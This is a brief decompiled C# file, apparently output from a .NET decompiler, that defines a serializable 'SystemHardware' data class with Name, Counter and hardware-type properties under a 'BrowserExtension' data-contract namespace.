using System;
using System.Runtime.Serialization;

// Token: 0x02000050 RID: 80
[DataContract(Name = "SystemHardware", Namespace = "BrowserExtension")]
public class SystemHardware
{
	// Token: 0x17000042 RID: 66
	// (get) Token: 0x0600018F RID: 399 RVA: 0x00009E4C File Offset: 0x0000804C
	// (set) Token: 0x06000190 RID: 400 RVA: 0x00009E54 File Offset: 0x00008054
	[DataMember(Name = "Name")]
	public string Name { get; set; }

	// Token: 0x17000043 RID: 67
	// (get) Token: 0x06000191 RID: 401 RVA: 0x00009E5D File Offset: 0x0000805D
	// (set) Token: 0x06000192 RID: 402 RVA: 0x00009E65 File Offset: 0x00008065
	[DataMember(Name = "Counter")]
	public string Counter { get; set; }

	// Token: 0x17000044 RID: 68
	// (get) Token: 0x06000193 RID: 403 RVA: 0x00009E6E File Offset: 0x0000806E
	// (set) Token: 0x06000194 RID: 404 RVA: 0x00009E76 File Offset: 0x00008076
	[DataMember(Name = "HardType")]
	public HardwareType HardType { get; set; }
}
